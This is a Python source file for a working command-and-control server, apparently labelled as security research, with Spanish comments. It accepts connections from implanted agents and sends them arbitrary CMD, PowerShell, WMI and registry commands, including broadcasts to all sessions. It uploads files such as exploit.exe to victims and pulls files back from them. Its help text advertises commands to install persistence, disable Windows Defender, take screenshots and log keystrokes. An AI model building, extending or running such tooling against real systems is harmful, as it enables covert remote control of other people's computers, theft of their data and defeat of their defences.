#!/usr/bin/env python3


"""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                    ADVANCED C2 SERVER                        â•‘
â•‘                    Author: Jdexploit                         â•‘
â•‘                    Created: 2026                             â•‘
â•‘                    Purpose: Security Research                â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
"""

#!/usr/bin/env python3
# kali_c2_complete.py - C2 CON TODOS LOS TIPOS DE COMANDOS
import socket
import struct
import json
import base64
import time
import threading
import os
import sys
import readline
import shutil
from datetime import datetime

class CompleteC2Server:
    def __init__(self, port=4444):
        self.port = port
        self.sessions = {}
        self.running = True
        self.command_history = []
        
    def start(self):
        sock = socket.socket()
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', self.port))
        sock.listen(100)
        
        print(f"""
        â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                    ADVANCED C2 SERVER                        â•‘
â•‘                    Author: Jdexploit                         â•‘
â•‘                    Created: 2026                             â•‘
â•‘                    Purpose: Security Research                â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        """)
        
        print(f"[+] Listening on 0.0.0.0:{self.port}")
        
        # Configurar autocompletado
        self._setup_autocomplete()
        
        # Thread para aceptar conexiones
        accept_thread = threading.Thread(target=self._accept_connections, args=(sock,))
        accept_thread.daemon = True
        accept_thread.start()
        
        # Shell principal
        self._main_shell()
        
    def _setup_autocomplete(self):
        """Configurar autocompletado con TAB"""
        if sys.platform != 'win32':
            readline.parse_and_bind("tab: complete")
            
            commands = [
                'sessions', 'session', 'help', 'clear', 'exit', 'kill',
                'broadcast', 'status', 'upload', 'downloads', 'history',
                'commands', 'shell', 'powershell', 'cmd', 'wmic', 'reg',
                'net', 'tasklist', 'ipconfig', 'systeminfo', 'whoami',
                'dir', 'copy', 'move', 'del', 'type', 'find', 'findstr',
                'netstat', 'route', 'arp', 'ping', 'tracert', 'nslookup',
                'sc', 'schtasks', 'wusa', 'bitsadmin', 'certutil',
                'vssadmin', 'bcdedit', 'diskpart', 'chkdsk', 'sfc',
                'dism', 'gpresult', 'gpupdate', 'logoff', 'shutdown',
                'getmac', 'systeminfo', 'ver', 'hostname', 'query'
            ]
            
            def completer(text, state):
                options = [cmd for cmd in commands if cmd.startswith(text)]
                if state < len(options):
                    return options[state]
                return None
            
            readline.set_completer(completer)
    
    def _accept_connections(self, sock):
        while self.running:
            try:
                client, addr = sock.accept()
                thread = threading.Thread(target=self._handle_agent, args=(client, addr))
                thread.daemon = True
                thread.start()
            except:
                break
    
    def _handle_agent(self, client, addr):
        session_id = f"{addr[0]}_{int(time.time())}"
        
        try:
            # Protocolo RECIBIR
            def recv_msg():
                try:
                    length_data = client.recv(4)
                    if not length_data or len(length_data) != 4:
                        return None
                    
                    length = struct.unpack('>I', length_data)[0]
                    
                    data = b''
                    while len(data) < length:
                        chunk = client.recv(min(4096, length - len(data)))
                        if not chunk:
                            return None
                        data += chunk
                    
                    return data.decode('utf-8', errors='ignore')
                except:
                    return None
            
            # Protocolo ENVIAR
            def send_msg(data):
                try:
                    if isinstance(data, str):
                        data = data.encode('utf-8', errors='ignore')
                    
                    length = len(data)
                    client.sendall(struct.pack('>I', length) + data)
                    return True
                except:
                    return False
            
            # Recibir handshake
            handshake = recv_msg()
            if handshake:
                try:
                    info = json.loads(handshake)
                    self.sessions[session_id] = {
                        'client': client,
                        'addr': addr,
                        'info': info,
                        'recv': recv_msg,
                        'send': send_msg,
                        'connected_at': datetime.now(),
                        'last_command': None
                    }
                    
                    print(f"\n[+] NUEVA CONEXIÃ“N: {session_id}")
                    print(f"    Host: {info.get('hostname', 'Unknown')}")
                    print(f"    User: {info.get('user', 'Unknown')}")
                    print(f"    ID: {info.get('id', 'Unknown')}")
                    print(f"    Time: {info.get('time', 'Unknown')}")
                    
                    # Thread para recibir respuestas
                    response_thread = threading.Thread(
                        target=self._receive_responses,
                        args=(session_id,)
                    )
                    response_thread.daemon = True
                    response_thread.start()
                    
                except json.JSONDecodeError:
                    print(f"[+] Raw handshake: {handshake[:100]}")
                    client.close()
        
        except:
            client.close()
    
    def _receive_responses(self, session_id):
        """Recibir respuestas del agente"""
        while session_id in self.sessions and self.running:
            try:
                session = self.sessions[session_id]
                data = session['recv']()
                
                if data:
                    print(f"\n[RESPUESTA de {session_id}]:")
                    print("=" * 80)
                    
                    try:
                        response = json.loads(data)
                        if response.get('type') == 'result':
                            command = response.get('command', 'Unknown')
                            result = response.get('result', '')
                            
                            print(f"Comando: {command}")
                            print("-" * 40)
                            
                            # Manejar tipos especiales de respuesta
                            if result.startswith('FILE:'):
                                # Descargar archivo
                                parts = result.split(':', 2)
                                if len(parts) == 3:
                                    filename = parts[1]
                                    filedata = parts[2]
                                    self._save_file(session_id, filename, filedata)
                            elif result.startswith('ERROR:'):
                                print(f"âŒ Error: {result[6:]}")
                            else:
                                print(result)
                            
                        elif response.get('type') == 'alive':
                            print(f"âœ… Agente activo - {datetime.now().strftime('%H:%M:%S')}")
                        else:
                            print(data)
                    except json.JSONDecodeError:
                        print(data)
                    
                    print("=" * 80)
                
                time.sleep(0.1)
                
            except:
                time.sleep(0.1)
    
    def _save_file(self, session_id, filename, b64_data):
        """Guardar archivo descargado"""
        try:
            downloads_dir = f"downloads/{session_id}"
            os.makedirs(downloads_dir, exist_ok=True)
            
            filepath = os.path.join(downloads_dir, filename)
            with open(filepath, 'wb') as f:
                f.write(base64.b64decode(b64_data))
            
            size = os.path.getsize(filepath)
            print(f"âœ… Archivo guardado: {filepath} ({size} bytes)")
        except Exception as e:
            print(f"âŒ Error guardando archivo: {e}")
    
    def _main_shell(self):
        """Shell principal con autocompletado"""
        while self.running:
            try:
                cmd = input("\nğŸ”· c2> ").strip()
                
                if not cmd:
                    continue
                
                # Guardar en historial
                self.command_history.append({
                    'time': datetime.now(),
                    'command': cmd,
                    'type': 'main'
                })
                
                if cmd.lower() == 'exit':
                    self.running = False
                    print("\n[!] Cerrando C2 Server...")
                    break
                
                elif cmd.lower() == 'help':
                    self._show_main_help()
                
                elif cmd.lower() == 'sessions':
                    self._list_sessions()
                
                elif cmd.lower().startswith('session '):
                    parts = cmd.split(' ', 1)
                    if len(parts) == 2:
                        self._session_shell(parts[1])
                
                elif cmd.lower() == 'clear':
                    os.system('clear')
                
                elif cmd.lower() == 'broadcast':
                    self._broadcast_command()
                
                elif cmd.lower().startswith('kill '):
                    session_id = cmd[5:].strip()
                    self._kill_session(session_id)
                
                elif cmd.lower() == 'status':
                    self._show_status()
                
                elif cmd.lower() == 'history':
                    self._show_history()
                
                elif cmd.lower() == 'downloads':
                    self._list_downloads()
                
                elif cmd.lower() == 'commands':
                    self._show_all_commands()
                
                elif cmd.lower().startswith('upload '):
                    parts = cmd[7:].strip().split(' ', 1)
                    if len(parts) == 2:
                        session_id = parts[0]
                        if session_id in self.sessions:
                            file_info = parts[1].split(' ', 1)
                            if len(file_info) == 2:
                                self._upload_file(session_id, file_info[0], file_info[1])
                        else:
                            print(f"âŒ SesiÃ³n no encontrada: {session_id}")
                
                else:
                    print("âŒ Comando no reconocido. Usa 'help'")
                    
            except KeyboardInterrupt:
                print("\n[!] Usa 'exit' para salir")
            except Exception as e:
                print(f"âŒ Error: {e}")
    
    def _session_shell(self, session_id):
        """Shell de sesiÃ³n especÃ­fica"""
        if session_id not in self.sessions:
            print(f"âŒ SesiÃ³n no encontrada: {session_id}")
            return
        
        session = self.sessions[session_id]
        info = session['info']
        
        print(f"\nğŸ”· SesiÃ³n activa: {session_id}")
        print(f"   Host: {info.get('hostname')}")
        print(f"   User: {info.get('user')}")
        print(f"   Tipo 'help' para comandos, 'back' para volver\n")
        
        # Configurar autocompletado para sesiÃ³n
        session_commands = [
            'back', 'help', 'exit', 'info', 'download', 'upload',
            'shell', 'powershell', 'cmd', 'wmic', 'reg', 'net',
            'tasklist', 'ipconfig', 'systeminfo', 'whoami', 'hostname',
            'dir', 'cd', 'copy', 'move', 'del', 'rmdir', 'mkdir',
            'type', 'find', 'findstr', 'attrib', 'xcopy', 'robocopy',
            'netstat', 'route', 'arp', 'ping', 'tracert', 'nslookup',
            'sc', 'schtasks', 'wusa', 'bitsadmin', 'certutil',
            'vssadmin', 'bcdedit', 'diskpart', 'chkdsk', 'sfc',
            'dism', 'gpresult', 'gpupdate', 'logoff', 'shutdown',
            'getmac', 'ver', 'query', 'wevtutil', 'wmic',
            'ps', 'get-process', 'get-service', 'get-eventlog',
            'get-wmiobject', 'get-netconnection', 'get-netipaddress',
            'persistence', 'screenshot', 'keylog', 'defender'
        ]
        
        def session_completer(text, state):
            options = [cmd for cmd in session_commands if cmd.startswith(text)]
            if state < len(options):
                return options[state]
            return None
        
        if sys.platform != 'win32':
            readline.set_completer(session_completer)
        
        while session_id in self.sessions:
            try:
                prompt = f"ğŸ”¹ c2@{session_id[:10]}> "
                cmd = input(prompt).strip()
                
                if not cmd:
                    continue
                
                # Guardar en historial
                self.command_history.append({
                    'time': datetime.now(),
                    'command': f"{session_id}: {cmd}",
                    'type': 'session'
                })
                
                if cmd.lower() == 'back':
                    break
                
                elif cmd.lower() == 'help':
                    self._show_session_help()
                
                elif cmd.lower() == 'exit':
                    self._send_command(session_id, {'type': 'exit'})
                    break
                
                elif cmd.lower() == 'info':
                    self._send_command(session_id, {'type': 'command', 'command': 'sysinfo'})
                
                # COMANDOS CON PREFIJO
                elif cmd.lower().startswith('shell '):
                    command = cmd[6:].strip()
                    self._send_command(session_id, {'type': 'command', 'command': command})
                
                elif cmd.lower().startswith('powershell '):
                    command = cmd[11:].strip()
                    full_cmd = f"powershell -Command \"{command}\""
                    self._send_command(session_id, {'type': 'command', 'command': full_cmd})
                
                elif cmd.lower().startswith('cmd '):
                    command = cmd[4:].strip()
                    full_cmd = f"cmd /c {command}"
                    self._send_command(session_id, {'type': 'command', 'command': full_cmd})
                
                elif cmd.lower().startswith('wmic '):
                    command = cmd[5:].strip()
                    full_cmd = f"wmic {command}"
                    self._send_command(session_id, {'type': 'command', 'command': full_cmd})
                
                elif cmd.lower().startswith('reg '):
                    command = cmd[4:].strip()
                    full_cmd = f"reg {command}"
                    self._send_command(session_id, {'type': 'command', 'command': full_cmd})
                
                elif cmd.lower().startswith('net '):
                    command = cmd[4:].strip()
                    full_cmd = f"net {command}"
                    self._send_command(session_id, {'type': 'command', 'command': full_cmd})
                
                elif cmd.lower().startswith('download '):
                    filepath = cmd[9:].strip()
                    self._send_command(session_id, {'type': 'command', 'command': f'download {filepath}'})
                
                elif cmd.lower().startswith('upload '):
                    parts = cmd[7:].strip().split(' ', 1)
                    if len(parts) == 2:
                        self._upload_file(session_id, parts[0], parts[1])
                
                # COMANDOS ESPECIALES
                elif cmd.lower() == 'screenshot':
                    print("âš ï¸  Nota: Para screenshots necesitas Pillow instalado en el agente")
                    self._send_command(session_id, {'type': 'command', 'command': 'screenshot'})
                
                elif cmd.lower() == 'persistence':
                    self._send_command(session_id, {'type': 'command', 'command': 'persistence'})
                
                elif cmd.lower() == 'defender':
                    self._send_command(session_id, {'type': 'command', 'command': 'clear_defender'})
                
                # COMANDO DIRECTO (sin prefijo)
                else:
                    self._send_command(session_id, {'type': 'command', 'command': cmd})
                    
            except KeyboardInterrupt:
                print("\n[!] Volviendo al menÃº principal...")
                break
        
        # Restaurar autocompletado principal
        if sys.platform != 'win32':
            readline.set_completer(None)
    
    def _send_command(self, session_id, cmd_data):
        """Enviar comando al agente"""
        if session_id not in self.sessions:
            print(f"âŒ SesiÃ³n no existe: {session_id}")
            return
        
        session = self.sessions[session_id]
        
        try:
            if session['send'](json.dumps(cmd_data)):
                command = cmd_data.get('command', 'Unknown')
                print(f"âœ… Comando enviado: {command[:80]}...")
                session['last_command'] = command
            else:
                print(f"âŒ Error enviando comando")
                del self.sessions[session_id]
                
        except Exception as e:
            print(f"âŒ Error: {e}")
            if session_id in self.sessions:
                del self.sessions[session_id]
    
    def _upload_file(self, session_id, local_path, remote_path):
        """Subir archivo al agente"""
        if not os.path.exists(local_path):
            print(f"âŒ Archivo local no existe: {local_path}")
            return
        
        try:
            with open(local_path, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode('ascii')
            
            upload_cmd = f'upload {file_data} {remote_path}'
            self._send_command(session_id, {'type': 'command', 'command': upload_cmd})
            
        except Exception as e:
            print(f"âŒ Error preparando upload: {e}")
    
    def _broadcast_command(self):
        """Enviar comando a todas las sesiones"""
        if not self.sessions:
            print("âŒ No hay sesiones activas")
            return
        
        command = input("Comando para broadcast: ").strip()
        if not command:
            return
        
        confirm = input(f"Â¿Enviar '{command}' a {len(self.sessions)} sesiones? (y/n): ")
        if confirm.lower() != 'y':
            return
        
        for sid in list(self.sessions.keys()):
            self._send_command(sid, {'type': 'command', 'command': command})
    
    def _kill_session(self, session_id):
        """Terminar sesiÃ³n"""
        if session_id in self.sessions:
            self._send_command(session_id, {'type': 'exit'})
            print(f"âœ… SesiÃ³n terminada: {session_id}")
        else:
            print(f"âŒ SesiÃ³n no encontrada: {session_id}")
    
    def _list_sessions(self):
        if not self.sessions:
            print("âŒ No hay sesiones activas")
            return
        
        print(f"\nâœ… Sesiones activas ({len(self.sessions)}):")
        print("â•" * 100)
        
        for i, (sid, session) in enumerate(self.sessions.items(), 1):
            info = session['info']
            uptime = (datetime.now() - session['connected_at']).seconds
            
            print(f"{i:2}. {sid}")
            print(f"   â”œâ”€ Host: {info.get('hostname')}")
            print(f"   â”œâ”€ User: {info.get('user')}")
            print(f"   â”œâ”€ ID: {info.get('id')}")
            print(f"   â”œâ”€ Uptime: {uptime}s")
            print(f"   â”œâ”€ IP: {session['addr'][0]}:{session['addr'][1]}")
            print(f"   â””â”€ Last cmd: {session.get('last_command', 'None')}")
            print("â”€" * 100)
    
    def _show_status(self):
        """Mostrar estado del servidor"""
        print(f"\nğŸ“Š ESTADO DEL SERVIDOR C2")
        print("â•" * 50)
        print(f"   Puerto: {self.port}")
        print(f"   Sesiones activas: {len(self.sessions)}")
        print(f"   Comandos en historial: {len(self.command_history)}")
        print(f"   Hora actual: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"   Directorio: {os.getcwd()}")
        print("â•" * 50)
        
        # Espacio en disco
        if os.path.exists('downloads'):
            total_size = 0
            for dirpath, dirnames, filenames in os.walk('downloads'):
                for f in filenames:
                    fp = os.path.join(dirpath, f)
                    total_size += os.path.getsize(fp)
            print(f"   Descargas: {total_size / 1024:.1f} KB")
    
    def _show_history(self):
        """Mostrar historial de comandos"""
        if not self.command_history:
            print("âŒ No hay historial de comandos")
            return
        
        print(f"\nğŸ“œ HISTORIAL DE COMANDOS ({len(self.command_history)})")
        print("â•" * 100)
        
        for i, item in enumerate(self.command_history[-20:], 1):  # Ãšltimos 20
            time_str = item['time'].strftime('%H:%M:%S')
            print(f"{i:3}. {time_str} - {item['type']}: {item['command'][:80]}")
        
        print("â•" * 100)
    
    def _list_downloads(self):
        """Listar archivos descargados"""
        if not os.path.exists('downloads'):
            print("âŒ No hay directorio de descargas")
            return
        
        print(f"\nğŸ“‚ ARCHIVOS DESCARGADOS")
        print("â•" * 80)
        
        total_files = 0
        total_size = 0
        
        for session_id in os.listdir('downloads'):
            session_dir = os.path.join('downloads', session_id)
            if os.path.isdir(session_dir):
                print(f"\nğŸ“ SesiÃ³n: {session_id}")
                for filename in os.listdir(session_dir):
                    filepath = os.path.join(session_dir, filename)
                    if os.path.isfile(filepath):
                        size = os.path.getsize(filepath)
                        total_files += 1
                        total_size += size
                        print(f"   â”œâ”€ {filename} ({size} bytes)")
        
        print(f"\nğŸ“Š Total: {total_files} archivos, {total_size / 1024:.1f} KB")
        print("â•" * 80)
    
    def _show_all_commands(self):
        """Mostrar todos los comandos disponibles"""
        print("""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                         TODOS LOS TIPOS DE COMANDOS                          â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

ğŸ”· COMANDOS DEL SISTEMA C2:
  sessions          - Listar agentes conectados
  session <id>      - Interactuar con agente especÃ­fico
  broadcast         - Enviar comando a todos los agentes
  kill <id>         - Terminar sesiÃ³n especÃ­fica
  status            - Estado del servidor
  history           - Historial de comandos
  downloads         - Listar archivos descargados
  clear             - Limpiar pantalla
  exit              - Salir

ğŸ”· COMANDOS BÃSICOS WINDOWS:
  whoami            - Usuario actual
  hostname          - Nombre del equipo
  systeminfo        - InformaciÃ³n del sistema
  ver               - VersiÃ³n de Windows
  time /t           - Hora actual
  date /t           - Fecha actual

ğŸ”· COMANDOS DE ARCHIVOS:
  dir               - Listar directorio
  cd                - Cambiar directorio
  type              - Mostrar contenido de archivo
  copy              - Copiar archivos
  move              - Mover archivos
  del               - Eliminar archivos
  ren               - Renombrar archivos
  mkdir             - Crear directorio
  rmdir             - Eliminar directorio
  attrib            - Atributos de archivos
  xcopy             - Copia avanzada
  robocopy          - Robusta copia de archivos
  find              - Buscar texto en archivos
  findstr           - Buscar con expresiones regulares

ğŸ”· COMANDOS DE RED:
  ipconfig          - ConfiguraciÃ³n IP
  ipconfig /all     - ConfiguraciÃ³n IP completa
  netstat           - Conexiones de red
  netstat -ano      - Conexiones con PID
  ping              - Prueba de conectividad
  tracert           - Rastreo de ruta
  nslookup          - Consultas DNS
  route             - Tabla de enrutamiento
  arp               - Tabla ARP
  getmac            - Direcciones MAC
  netsh             - ConfiguraciÃ³n de red avanzada

ğŸ”· COMANDOS DE PROCESOS Y SERVICIOS:
  tasklist          - Listar procesos
  taskkill          - Terminar procesos
  wmic process      - Administrar procesos (WMI)
  sc                - Administrar servicios
  net start         - Iniciar servicio
  net stop          - Detener servicio
  schtasks          - Tareas programadas

ğŸ”· COMANDOS DE USUARIOS Y GRUPOS:
  net user          - Listar usuarios
  net user <nombre> - Info de usuario especÃ­fico
  net localgroup    - Listar grupos locales
  net localgroup administrators - Administradores
  net group         - Grupos de dominio
  whoami /groups    - Grupos del usuario actual
  whoami /priv      - Privilegios del usuario

ğŸ”· COMANDOS DEL REGISTRO:
  reg query         - Consultar registro
  reg add           - Agregar entrada
  reg delete        - Eliminar entrada
  reg copy          - Copiar entrada
  reg save          - Guardar clave del registro
  reg load          - Cargar clave del registro

ğŸ”· COMANDOS DE DISCO Y SISTEMA DE ARCHIVOS:
  chkdsk            - Verificar disco
  diskpart          - Administrar particiones
  format            - Formatear disco
  fsutil            - Utilidades del sistema de archivos
  vssadmin          - Administrador de instantÃ¡neas de volumen
  defrag            - Desfragmentar disco

ğŸ”· COMANDOS DE SEGURIDAD:
  gpresult          - Resultados de polÃ­ticas de grupo
  gpupdate          - Actualizar polÃ­ticas de grupo
  auditpol          - PolÃ­ticas de auditorÃ­a
  secedit           - Editor de configuraciÃ³n de seguridad
  cipher            - Cifrado de archivos

ğŸ”· COMANDOS DE EVENTOS Y LOGS:
  wevtutil          - Utilidad de eventos de Windows
  eventcreate       - Crear eventos personalizados
  typeperf          - Mostrar contadores de rendimiento

ğŸ”· COMANDOS DE WINDOWS MANAGEMENT INSTRUMENTATION (WMI):
  wmic bios         - InformaciÃ³n del BIOS
  wmic cpu          - InformaciÃ³n del CPU
  wmic memorychip   - InformaciÃ³n de memoria
  wmic diskdrive    - InformaciÃ³n de discos
  wmic nic          - InformaciÃ³n de red
  wmic os           - InformaciÃ³n del sistema operativo
  wmic process      - InformaciÃ³n de procesos
  wmic service      - InformaciÃ³n de servicios
  wmic startup      - Programas de inicio
  wmic useraccount  - InformaciÃ³n de usuarios

ğŸ”· COMANDOS DE POWERSHELL (prefijo 'powershell '):
  Get-Process       - Obtener procesos
  Get-Service       - Obtener servicios
  Get-EventLog      - Obtener logs de eventos
  Get-WmiObject     - Consultas WMI
  Get-NetTCPConnection - Conexiones TCP
  Get-NetIPAddress  - Direcciones IP
  Get-HotFix        - Actualizaciones instaladas
  Get-LocalUser     - Usuarios locales
  Get-LocalGroup    - Grupos locales
  Get-ChildItem     - Listar archivos (como dir)
  Test-Connection   - Como ping
  Start-Process     - Iniciar proceso
  Stop-Process      - Detener proceso
  Invoke-WebRequest - Descargar desde web
  ConvertTo-Json    - Convertir a JSON
  ConvertFrom-Json  - Convertir desde JSON

ğŸ”· COMANDOS DE RED AVANZADOS:
  netsh interface   - ConfiguraciÃ³n de interfaces
  netsh firewall    - ConfiguraciÃ³n de firewall
  netsh wlan        - ConfiguraciÃ³n WiFi
  nbtstat           - EstadÃ­sticas NetBIOS
  pathping         - Ping con informaciÃ³n de ruta

ğŸ”· COMANDOS DE INSTALACIÃ“N Y ACTUALIZACIÃ“N:
  wusa              - Instalador de actualizaciones
  dism              - AdministraciÃ³n de imÃ¡genes
  msiexec           - Instalador de MSI

ğŸ”· COMANDOS DE INFORMACIÃ“N DEL SISTEMA:
  systeminfo        - InformaciÃ³n completa
  msinfo32          - InformaciÃ³n del sistema (GUI)
  dxdiag            - DiagnÃ³stico DirectX
  winver            - VersiÃ³n de Windows

ğŸ”· COMANDOS DE ADMINISTRACIÃ“N REMOTA:
  psexec            - Ejecutar en sistema remoto
  wmic /node        - WMI remoto
  schtasks /s       - Tareas programadas remotas

ğŸ”· COMANDOS ESPECIALES DEL AGENTE:
  download <ruta>   - Descargar archivo
  upload <loc> <rem> - Subir archivo
  screenshot        - Capturar pantalla (requiere Pillow)
  persistence       - Instalar persistencia
  defender          - Desactivar Windows Defender
  sysinfo           - InformaciÃ³n del sistema (personalizada)

â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                    EJEMPLOS PRÃCTICOS DE USO                                 â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

  Ejecutar PowerShell: powershell Get-Process | Select Name, CPU
  Descargar archivo: download C:\\Windows\\System32\\drivers\\etc\\hosts
  Subir archivo: upload /home/kali/exploit.exe C:\\Windows\\Temp\\exploit.exe
  InformaciÃ³n completa: systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
  Buscar archivos: dir /s C:\\*.pdf
  Procesos por CPU: powershell Get-Process | Sort CPU -Descending | Select -First 10
  Conexiones activas: netstat -ano | findstr ESTABLISHED
  Usuarios del sistema: net user
  Tareas programadas: schtasks /query /fo LIST
  Entradas de inicio: reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
  InformaciÃ³n de red: ipconfig /all | findstr /C:"IPv4" /C:"Default Gateway"
        """)
    
    def _show_main_help(self):
        print("""
ğŸ”· COMANDOS PRINCIPALES:
  sessions          - Listar agentes conectados
  session <id>      - Interactuar con agente
  broadcast         - Enviar comando a todos
  kill <id>         - Terminar sesiÃ³n
  status            - Estado del servidor
  history           - Historial de comandos
  downloads         - Archivos descargados
  commands          - Mostrar todos los comandos
  clear             - Limpiar pantalla
  exit              - Salir

ğŸ”· USO:
  c2> session 192.168.1.100_1234567890
  c2@192.168.1.100_1234567890> whoami
  c2@192.168.1.100_1234567890> dir C:\\
  c2@192.168.1.100_1234567890> powershell Get-Process
  c2@192.168.1.100_1234567890> download C:\\Windows\\System32\\drivers\\etc\\hosts
        """)
    
    def _show_session_help(self):
        print("""
ğŸ”· USO DE COMANDOS EN SESIÃ“N:
  
  ğŸ“Œ SIN PREFIJO (ejecuta directamente):
    whoami
    dir C:\\
    ipconfig
    systeminfo
  
  ğŸ“Œ CON PREFIJO 'shell ' (para comandos con espacios/opciones):
    shell net user /domain
    shell tasklist /v
    shell findstr "password" *.txt
  
  ğŸ“Œ CON PREFIJO 'powershell ' (ejecutar PowerShell):
    powershell Get-Process
    powershell Get-Service | Where Status -eq 'Running'
    powershell Invoke-WebRequest -Uri http://example.com
  
  ğŸ“Œ CON OTROS PREFIJOS:
    cmd <comando>          - Forzar ejecuciÃ³n en CMD
    wmic <consulta>        - Consultas WMI
    reg <operaciÃ³n>        - Operaciones de registro
    net <comando>          - Comandos de red
  
  ğŸ“Œ COMANDOS ESPECIALES:
    download <ruta>        - Descargar archivo
    upload <local> <remoto> - Subir archivo
    info                   - InformaciÃ³n del sistema
    persistence            - Instalar persistencia
    defender               - Desactivar Windows Defender
    screenshot             - Capturar pantalla
  
  ğŸ“Œ PARA VOLVER AL MENÃš PRINCIPAL:
    back                   - Regresar al menÃº C2
    exit                   - Cerrar sesiÃ³n actual
  
  ğŸ’¡ TIP: Usa TAB para autocompletar comandos
        """)

def main():
    print("\n" + "="*80)
    print("COMPLETE C2 SERVER - TODOS LOS TIPOS DE COMANDOS")
    print("="*80)
    
    # Crear directorios necesarios
    os.makedirs("downloads", exist_ok=True)
    
    server = CompleteC2Server(port=4444)
    
    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[!] Server stopped by user")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    main()
